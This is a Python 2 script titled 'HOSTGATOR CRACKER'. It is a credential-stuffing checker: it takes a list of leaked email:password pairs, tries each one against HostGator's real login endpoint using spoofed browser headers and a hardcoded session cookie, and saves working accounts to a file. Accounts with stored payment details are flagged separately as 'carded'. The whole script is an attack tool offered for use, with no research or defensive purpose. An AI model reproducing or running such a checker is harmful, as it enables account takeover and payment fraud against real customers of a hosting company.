#!/usr/bin/python

# -*- coding: utf-8 -*-



# ( -- IMPORTS -- ) #

import requests

import time

import json

import sys

from random import *

import random

from colorama import Fore

from colorama import Style

from pprint import pprint

from colorama import init

init(autoreset=True)



# ( -- COLORAMA COLORS -- ) #

rd = Fore.RED

cy = Fore.CYAN

wh = Fore.WHITE

gr = Fore.GREEN

yl = Fore.YELLOW

mg = Fore.MAGENTA

bl = Fore.BLACK



# ( -- LOGO * INFO -- ) #

bugs = '''{} {}

|                                                                          

 [$] HOSTGATOR CRACKER.



'''.format(mg, mg)

#################################

# ( -- PROGRAMMED BY @BUGS -- ) #

#################################



# ( -- FULL API SCRIPT -- ) #



print bugs

print '\n{} {}[+] HOSTGATOR CEK [+]'.format(cy, cy)

print ''

# ----------------------------------- ## ----------------------------------- #

req_url = 'https://checkout.hostgator.com/signup/login'

req_headers = {

	'Accept': '*/*',

	'Origin': 'https://checkout.hostgator.com',

	'X-Requested-With': 'XMLHttpRequest',

	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36',

	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',

	'Referer': 'https://checkout.hostgator.com/signup/reseller/9/36/SNAPPYR192424',

	'Cookie': 'mt.v=2.91085436.1523474663546; _ga=GA1.2.1399513016.1523474671; IR_PI=1523474680871.b5ws2g1gqok; cybbaGeneralTrafficTrack=1; brwsr=292a5c79-7d7a-a337-07d8-1d014c019326; cybGeoPushed=1; __mmapiwsid=b6a296b6-5a98-44ba-af87-c70f26e4262d:2028e5e898703d4b7787699a5e849c1b217ee35d; cybbaHasCartTrackAbandon=258.14; __utmz=190019242.1523737731.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _ga=GA1.3.1399513016.1523474671; extole_access_token=MG1TI59N6SD1PO8QOH7LN39PGI; _gcl_aw=GCL.1524326085.CjwKCAjwwuvWBRBZEiwALXqjw2jZAEWPPcURalC7dMsrSmRNypAD08nRfR0zeWyB59wp9RQ1fD5MwBoCnV0QAvD_BwE; _gac_UA-69116836-7=1.1524326085.CjwKCAjwwuvWBRBZEiwALXqjw2jZAEWPPcURalC7dMsrSmRNypAD08nRfR0zeWyB59wp9RQ1fD5MwBoCnV0QAvD_BwE; _gac_UA-5239867-1=1.1524326086.CjwKCAjwwuvWBRBZEiwALXqjw2jZAEWPPcURalC7dMsrSmRNypAD08nRfR0zeWyB59wp9RQ1fD5MwBoCnV0QAvD_BwE; _gac_UA-5239867-1=1.1524326086.CjwKCAjwwuvWBRBZEiwALXqjw2jZAEWPPcURalC7dMsrSmRNypAD08nRfR0zeWyB59wp9RQ1fD5MwBoCnV0QAvD_BwE; ken_kclid=f1e67282-23a3-4adf-ba0b-dd62fd558dbf; _evga_fc55=5eeee3f0f2e4a5ea.022; __utma=190019242.1399513016.1523474671.1525281303.1525295794.3; __utmz=201221175.1525379348.6.3.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); IRF_382=%7Bvisits%3A5%2Cuser%3A%7Btime%3A1523474680824%2Cref%3A%22direct%22%2Cpv%3A8%2Ccap%3A%7B%7D%2Cv%3A%7B%7D%7D%2Cvisit%3A%7Btime%3A1525379356434%2Cref%3A%22https%3A%2F%2Fwww.google.com%2F%22%2Cpv%3A2%2Ccap%3A%7B%7D%2Cv%3A%7B%7D%7D%2Clp%3A%22https%3A%2F%2Fwww.hostgator.com%2Fpress-releases%2FHostGator-launches-optimized-wp%22%2Cdebug%3A0%2Ca%3A1525379357198%7D; country=USA; Currency=USD; Currency_Symbol=%24; box=Salted__F%A1%D0%15%B1%BE%F8%2A%FC%A8%25%21%A4%D9%25%3C%13%DB%F8%0F%FA%D6%86%A7%2C%5C%FCV%B4%CFc%FFX%89%04%CF%5E6%0D%D2%81d%C6%CE%E9%D0%A8%DA%89w%B9Wf%87%E5%3F%FB%A6%22zFa%3B%29w%2AmEw%EF~%242%11%01%7F%AD%3C6%D6; session_id=bb36fc1c658a2a3f8113403669fda2990; __utma=201221175.1399513016.1523474671.1525379348.1528061281.7; __utmc=201221175; __utmt=1; gbclient_session=74925090534348713297504587072208701; customerpixel=%7B%22visits%22%3A3%2C%22current_visit%22%3A%222018-06-03%2021%3A30%3A17%22%2C%22last_visit%22%3A%222018-06-03%2021%3A28%3A06%22%2C%22first_visit%22%3A%222018-06-03%2021%3A27%3A56%22%2C%22login%22%3A0%7D; __utmb=201221175.13.2.1528061288516'

}

# ----------------------------------- ## ----------------------------------- #

list = raw_input('{} {}[X] List X> '.format(cy, cy))

print ''

# ----------------------------------- ## ----------------------------------- #

try:

	file = open(list,'r').readlines()

	list_len = str(len(file))

	print '{} {}[+] '.format(yl, yl) + 'YOUR LIST EMAILS NUM IS X> '.format(yl, yl) + list_len + '\n'

	count = 0

	try:

		for line in file:

			line = line.strip()

			count+=1

			email, password = line.split(':')

			req_data = 'username='+email+'&password='+password

			req = requests.post(req_url, data=req_data, headers=req_headers)

			src = req.content

			#print src

			if 'client_id' in src:

				if 'priority' in src:

					print '{} {}[+] '.format(gr, gr) + '(' + str(count) + ') ' + email + ':' + password + ' => [ + VALID CARDED + ]'.format(gr, gr)

					valid = open('VALID_HOSTGATOR.txt', 'a+')

					valid.write('[+] [ ' + email + ':' + password + ' ] => [ + VALID CARDED + ] \n')

					valid.close()

				else:

					print '{} {}[+] '.format(gr, gr) + '(' + str(count) + ') ' + email + ':' + password + ' => [ + VALID + ]'.format(gr, gr)

					valid = open('VALID_HOSTGATOR.txt', 'a+')

					valid.write('[+] [ ' + email + ':' + password + ' ] => [ + VALID + ] \n')

					valid.close()

			else:

				print '{} {}[+] '.format(rd, rd) + '(' + str(count) + ') ' + email + ':' + password + ' => [ + INVALID + ]'.format(rd, rd)

	except (IOError, TypeError) as e:

		print '[X] CAN NOT MAKE THE REQUEST.'

except (IOError, TypeError) as e:

	print '[X] CAN NOT OPEN THE PATH FILE PLEASE CHECK.'
